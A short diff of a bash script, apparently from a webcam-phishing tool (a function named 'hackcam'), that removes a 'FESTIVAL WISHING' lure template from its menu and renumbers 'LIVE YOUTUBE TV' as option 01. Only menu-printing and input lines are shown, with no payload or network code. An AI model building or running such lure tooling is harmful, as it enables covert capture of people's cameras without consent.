@@ -137,8 +137,7 @@ banner
 hackcam
 else
 printf "\n-----SELECT A TEMPLATE----\n"    
-printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m FESTIVAL WISHING\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m LIVE YOUTUBE TV\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m LIVE YOUTUBE TV\e[0m\n"
 default_option_template="1"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] SELECT A TEMPLATE: [Default is 1] \e[0m' option_tem
 option_tem="${option_tem:-${default_option_template}}"
